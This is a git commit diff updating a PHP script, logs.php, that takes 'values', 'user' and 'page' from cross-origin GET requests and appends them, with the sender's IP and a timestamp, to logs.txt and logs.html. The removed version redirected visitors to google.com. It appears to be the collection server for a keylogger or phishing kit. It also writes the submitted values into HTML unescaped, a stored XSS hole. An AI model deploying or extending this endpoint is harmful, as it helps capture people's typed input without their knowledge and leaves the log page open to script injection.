759298485d288c2d25f1fb5f43ce68bd0888beee
surendrakumar6350 <kamleshksks456@gmail.com>
2025-04-21 09:03:05 -0700

    Updated logs.php to include timestamp, user, values, and page in both logs.txt and logs.html

--- ServerSide_files/logs.php
+++ ServerSide_files/logs.php
@@ -1,17 +1,34 @@
 <?php
+header("Access-Control-Allow-Origin: *");
+date_default_timezone_set('Asia/Kolkata');
 
-	if($_GET){
-		$ip = $_SERVER['REMOTE_ADDR'] ;
-		$date = new DateTime("now", new DateTimeZone('America/Fortaleza') ); //SET YOUR DATETIMEZONE
-		$d =  $date->format('d/m/Y H:i:s');
-		$log = $_GET['values'];
-		$txt = '<tr> <th scope="row">'.$ip.'<br> '.$d.' </th> <td width="100%" class="box3D"> '.$log.' </td> </tr>';
-		$myfile = fopen("logs.html", "a+") or die("Unable to open file!");
-		fwrite($myfile, $txt);
-		fclose($myfile);
-		echo '<meta http-equiv="refresh" content=1;url="https://google.com">';
-	}else{
-		echo '<meta http-equiv="refresh" content=1;url="https://google.com">';
-	}
+$date = new DateTime("now", new DateTimeZone('Asia/Kolkata'));
+$d    = $date->format('d/m/Y H:i:s');
 
-?>
+$user   = isset($_GET['user']) ? $_GET['user'] : 'Unknown User';
+$values = isset($_GET['values']) ? $_GET['values'] : 'No Values';
+$page   = isset($_GET['page']) ? $_GET['page'] : 'No Page';
+
+file_put_contents("logs.txt", $d . " | " . $user . " | " . $values . " | " . $page . "\n", FILE_APPEND);
+
+if ($_GET) {
+    $ip  = $_SERVER['REMOTE_ADDR'];
+    $log = $_GET['values'];
+
+    $txt = '<tr>
+                <th scope="row">' . $ip . '<br>' . $d . ' </th>
+                <td width="100%" class="box3D">
+                    User: ' . $user . ' <br>
+                    Values: ' . $log . ' <br>
+                    Page: ' . $page . '
+                </td>
+            </tr>';
+
+    $myfile = fopen("logs.html", "a+") or die("Unable to open file!");
+    fwrite($myfile, $txt);
+    fclose($myfile);
+
+    echo 'Hello World';
+} else {
+    echo 'Hello World';
+}
